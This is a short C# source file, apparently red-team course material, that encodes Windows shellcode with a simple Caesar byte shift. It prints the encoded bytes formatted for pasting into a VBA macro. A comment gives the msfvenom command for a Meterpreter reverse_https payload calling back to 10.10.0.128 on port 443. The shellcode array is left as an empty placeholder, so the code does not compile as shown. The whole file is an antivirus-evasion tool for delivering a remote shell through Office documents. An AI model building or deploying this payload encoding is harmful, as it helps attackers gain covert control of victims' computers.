using System;
using System.Text;

namespace ShellcodeBuilder_VBA_Caesar
{
    class SCBuilder_VBA_Caesar
    {
        static void Main(string[] args)
        {

            // Shellcode
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.128 LPORT=443 -f csharp
           // Here 


            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 31) & 0xFF);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }

            Console.WriteLine("[+] Length of new payload: " + buf.Length);
            Console.WriteLine("[+] Payload: \n" + hex.ToString());
        }
    }
}
